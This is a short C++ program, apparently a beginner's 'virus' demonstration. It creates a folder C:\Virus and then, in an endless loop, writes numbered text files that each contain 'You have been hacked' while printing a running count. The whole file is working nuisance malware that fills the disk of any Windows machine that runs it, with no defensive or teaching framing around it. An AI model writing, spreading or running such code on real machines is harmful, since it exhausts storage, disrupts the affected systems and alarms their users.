#include <bits/stdc++.h>
#include <direct.h>

using namespace std;

int main()
{
    long i = 0;
    // Destination of files to be created
    const char *path = "C:\\Virus\\";

    // Message to be written inside the created files
    string msg = "You have been hacked";
    _mkdir(path); // getting inside our Virus folder

    while (true)
    {
        i++;
        ofstream file; // Creating a object
        file.open(path + to_string(i) + ".txt", ios_base::out); // naming the file and opening it
        file << msg; // Writing our message inside the file
        file.close();
        cout << "File Created " << i << endl;
    }
    
    return 0;
}